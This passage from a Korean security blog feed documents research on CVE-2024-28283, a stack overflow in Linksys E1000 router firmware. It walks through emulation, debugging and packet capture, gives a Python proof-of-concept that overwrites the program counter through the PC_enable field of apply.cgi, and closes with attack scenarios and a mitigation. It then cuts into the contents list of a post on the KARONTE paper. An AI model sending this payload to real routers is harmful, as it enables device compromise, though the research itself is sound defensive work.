&lt;p&gt;PoC는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;30byte+RET addr taint(4byte)&lt;/code&gt;까지만 하면 될 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;물론 정적으로 알아낼 수 있는 데에는 한계가 있다. 따라서 위 섹션에서 서술했던 추측을 확실하게 하려면, 동적으로 분석해야 한다.&lt;/p&gt;

&lt;p&gt;별다른 dynamic analysis prevention이 안 걸려 있는 것으로 보이기 때문에, 저 위치에 bp를 걸고 실행한 다음 데이터가 오가는 부분을 본다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;사족이지만, nvram_get 함수 자체에서 취약점이 발생할 여지가 높아 보여 개인적으로 검색해 봤는데, 발생한 이력이 있었다. 추가로, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apply.cgi&lt;/code&gt; url 또한 아래 취약점에서도 취약했던 url이었다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CVE-2018-3953&lt;/p&gt;

  &lt;p&gt;Devices in the Linksys ESeries line of routers (Linksys E1200 Firmware Version 2.0.09 and Linksys E2500 Firmware Version 3.0.04) are susceptible to OS command injection vulnerabilities due to improper filtering of data passed to and retrieved from NVRAM. Data entered into the ‘Router Name’ input field through the web portal is submitted to apply.cgi as the value to the ‘machine_name’ POST parameter. When the ‘preinit’ binary receives the SIGHUP signal, it enters a code path that continues until it reaches offset 0x0042B5C4 in the ‘start_lltd’ function. &lt;strong&gt;Within the ‘start_lltd’ function, a ‘nvram_get’ call is used to obtain the value of the user-controlled ‘machine_name’ NVRAM entry. This value is then entered directly into a command intended to write the host name to a file and subsequently executed.&lt;/strong&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;KARONTE를 돌려도 httpd는 border binary 로 치지 않아 분석 대상으로 보지 않았다. 즉, KARONTE로는 문제 취약점을 찾아낼 수 없었다.&lt;/p&gt;

&lt;p&gt;따라서 문제 취약점이 어떤 경로로 발견됐는지 고민하고 있었는데, Linksys 라우터 E 시리즈에서 발생했던 취약점 이력을 모두 모은 다음 해볼 만한 곳을 공략하는 정석적인 방식을 쓴 것 같았다.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-익스플로잇-환경-셋업&quot;&gt;1.2. 익스플로잇 환경 셋업&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/pr0v3rbs/FirmAE&quot;&gt;https://github.com/pr0v3rbs/FirmAE&lt;/a&gt; 에서 Firmware Emulator를 다운받아 직접 펌웨어를 구동하고, pc_change_act 를 참조하는 기능에 직접 페이로드를 보내 보는 것을 목적으로 한다.&lt;/p&gt;

&lt;p&gt;에뮬레이터 다운로드 후 레포에 나온 대로 설정을 끝내고, 아래 명령어를 실행했다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudo ./run.sh -c linksys ./firmwares/FW_E1000_2.1.03.005_US_20140321.bin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2023.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과, 192.168.1.1에 펌웨어상의 웹서버가 구동된 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;이제 디버깅을 위해 아래 명령어를 실행했다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudo ./run.sh -d linksys ./firmwares/FW_E1000_2.1.03.005_US_20140321.bin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2024.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;정상 구동되었음을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;이제 run gdbserver 옵션을 선택해 target pid에 httpd의 pid를 입력했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2025.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;gdb-multiarch를 설치해 위 사진에 나온 대로의 instruction을 따랐다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2026.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;pc_change_act에 접근하는 요청을 찾고 싶어서, gdb에서 다음과 같이 중단점을 설정했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2027.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 c로 실행되도록 해 두고, 웹서버에 접근했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2028.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;id, pw는 cisco 초기 id:pw값인 admin:admin 혹은 cisco:cisco를 넣어보면 로그인될 것이다.&lt;/p&gt;

&lt;p&gt;admin:admin이었다.&lt;/p&gt;

&lt;p&gt;익스플로잇 타겟 함수를 다시 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2016.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, 해당 함수에 날아가는 요청은 무조건 위의 strings 중 하나를 포함할 수밖에 없다.&lt;/p&gt;

&lt;p&gt;따라서, 웹서버를 구성하는 파일들에 대해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PC_enable&lt;/code&gt; string이 존재하는지 전수조사를 진행했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2029.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GuestNetworkSetting.asp&lt;/code&gt;에 해당 문자열이 존재함을 확인했다.&lt;/p&gt;

&lt;p&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55&lt;/code&gt; 에 접근해서, 아무 내용이나 바꾼 다음 ‘Save Settings’를 클릭해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2030.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위와 같이 기존에 설정해 두었던 bp에 걸림을 확인했다. 즉, 타겟 함수를 정상적으로 참조함을 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;13-익스플로잇-설계&quot;&gt;1.3. 익스플로잇 설계&lt;/h2&gt;

&lt;p&gt;이제 공격 지점을 알았으니 익스플로잇을 설계할 차례다.&lt;/p&gt;

&lt;p&gt;익스 패킷을 설계하기 위해 정상 요청의 포맷을 확인했다.&lt;/p&gt;

&lt;p&gt;해당 요청이 어떤 포맷으로 날아가는지 알기 위해 tcpdump를 사용했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2031.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과 아래와 같은 패킷 내용을 얻을 수 있었다.(개발자 도구로도 확인 가능하나, 개발자 도구로는 패킷 내용을 예쁘게 얻기 어려워 rawdata를 직접 얻었다)&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /apply.cgi;session_id=a5603bc78a2241abfe43afefbb587c55 HTTP/1.1
Host: 192.168.1.1
Connection: keep-alive
Content-Length: 140
Cache-Control: max-age=0
Origin: http://192.168.1.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

submit_button=GuestNetworkSetting&amp;amp;change_action=&amp;amp;gui_action=Apply&amp;amp;wait_time=19&amp;amp;submit_type=&amp;amp;del_mac=&amp;amp;gn_lan_ipaddr=4&amp;amp;gn_enable=0&amp;amp;PC_enable=1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;14-익스플로잇&quot;&gt;1.4. 익스플로잇&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;위와 같이 IDA에서 확인된 정보를 고려했을 때,&lt;/p&gt;

  &lt;p&gt;PoC는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;30byte+RET addr taint(4byte)&lt;/code&gt;까지만 하면 될 것 같다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;앞서 이렇게 분석한 바가 있고, 위와 같이 정상 패킷의 형태도 알고 있으니 이제 익스플로잇을 만들어 보자. 시간이 부족해 기존에 존재하는 익스플로잇을 활용했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ex.py
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter target IP: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter session_id: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apply.cgi;session_id=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/x-www-form-urlencoded&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Origin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Referer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apply.cgi;session_id=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upgrade-Insecure_Requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit_button&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GuestNetworkSetting&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gui_action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Apply&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;#dummy
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;#return address
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PC_enable&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위 스크립트를 아래와 같이 실행했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2032.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과, gdb에서 정상적으로 크래시가 발생한 점을 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2033.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2034.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;PC레지스터(next instruction을 가리키는 program counter 레지스터)에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x42424242&lt;/code&gt;, 즉 taint가 잘 들어갔다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-익스플로잇을-통해-가능한-침해-시나리오&quot;&gt;2. 익스플로잇을 통해 가능한 침해 시나리오&lt;/h1&gt;

&lt;p&gt;해당 펌웨어의 스택과 힙은 어떤 권한으로 돌아가는 중인지 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2035.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;전부 실행 권한을 가진 채로 돌아간다….&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;임베디드 디바이스 칩셋의 컴퓨팅 능력을 고려했��� 때, 펌웨어는 높은 확률로 ASLR이 걸리지 않은 환경에서 돌아갈 것이다.
    &lt;ul&gt;
      &lt;li&gt;즉 기초적인 시스템 해킹 능력이 있다면 누구나  RCE가 가능하다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;또한, 해당 라우터는 접근 권한을 세션 ID로 구분하고 있으나 세션 ID가 아래와 같이 GET의 파라미터로 들어오고 있었으며, http 통신을 사용하여 암호화되지 않은 트래픽을 매개하고 있었다.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;따라서 충분히 MITM 공격을 통한 관리자 세션 탈취가 가능하며, 해당 라우터에서는 L7까지의 기능을 제공하는 관계로 Application 레벨에서 가능한 공격(웹 익스플로잇)을 수행할 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;혹은 악성 파일 유포지로도 사용할 수 있을 것이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;물론 이와 같은 설정을 가진 라우터는 사내의 내부망 정도에서만 사용할 확률이 높으나, 망분리 환경에서도 침해사고는 발생하기 때문에 침해사고 발생시의 위험도를 크게 높이는 취약점으로 판단된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-mitigation-제시&quot;&gt;3. Mitigation 제시&lt;/h1&gt;

&lt;p&gt;일차적으로는 패킹을 해야 하긴 하지만, 임베디드 디바이스의 특성상 컴퓨팅 리소스의 한계로 인해 심볼을 날리는 것 이상의 패킹은 어려울 것으로 보인다.&lt;/p&gt;

&lt;p&gt;즉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;로 변경해서 올바른 데이터 크기 관리를 하는 것이 현재로서는 가장 근본적인 해결책이다.&lt;/p&gt;
</description>
        <pubDate>Sun, 26 Jan 2025 22:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/fuzzing/2025-01-27-CVE-2024-28283</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/fuzzing/2025-01-27-CVE-2024-28283</guid>
      </item>
    
      <item>
        <title>KARONTE: Detecting Insecure Multi-binary Interactions in Embedded Firmware 읽기</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-주안점&quot; id=&quot;markdown-toc-0-주안점&quot;&gt;0. 주안점&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-introduction&quot; id=&quot;markdown-toc-1-introduction&quot;&gt;1. Introduction&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#11-abstract&quot; id=&quot;markdown-toc-11-abstract&quot;&gt;1.1. Abstract&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-background&quot; id=&quot;markdown-toc-2-background&quot;&gt;2. Background&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#emersion-of-iot-devices&quot; id=&quot;markdown-toc-emersion-of-iot-devices&quot;&gt;Emersion of IoT devices&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#constraint-of-traditional-analysis-techniques&quot; id=&quot;markdown-toc-constraint-of-traditional-analysis-techniques&quot;&gt;Constraint of traditional analysis techniques&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#karonte&quot; id=&quot;markdown-toc-karonte&quot;&gt;KARONTE&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-approach-overview&quot; id=&quot;markdown-toc-3-approach-overview&quot;&gt;3. Approach Overview&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#31-firmware-pre-processing&quot; id=&quot;markdown-toc-31-firmware-pre-processing&quot;&gt;3.1. Firmware Pre-processing&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#32-border-binaries-discovery&quot; id=&quot;markdown-toc-32-border-binaries-discovery&quot;&gt;3.2. Border Binaries Discovery&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#33-binary-dependency-graphbdg-recovery&quot; id=&quot;markdown-toc-33-binary-dependency-graphbdg-recovery&quot;&gt;3.3. Binary Dependency Graph(BDG) Recovery&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#34-multi-binary-data-flow-analysis&quot; id=&quot;markdown-toc-34-multi-binary-data-flow-analysis&quot;&gt;3.4. Multi-binary Data-flow Analysis&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#35-insecure-interactions-detection&quot; id=&quot;markdown-toc-35-insecure-interactions-detection&quot;&gt;3.5. Insecure Interactions Detection&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-border-binaries-discovery&quot; id=&quot;markdown-toc-4-border-binaries-discovery&quot;&gt;4. Border Binaries Discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-binary-dependency-graph사실상-cpf가-핵심&quot; id=&quot;markdown-toc-5-binary-dependency-graph사실상-cpf가-핵심&quot;&gt;5. Binary Dependency Graph(사실상 CPF가 핵심)&lt;/a&gt;    &lt;ul&gt;
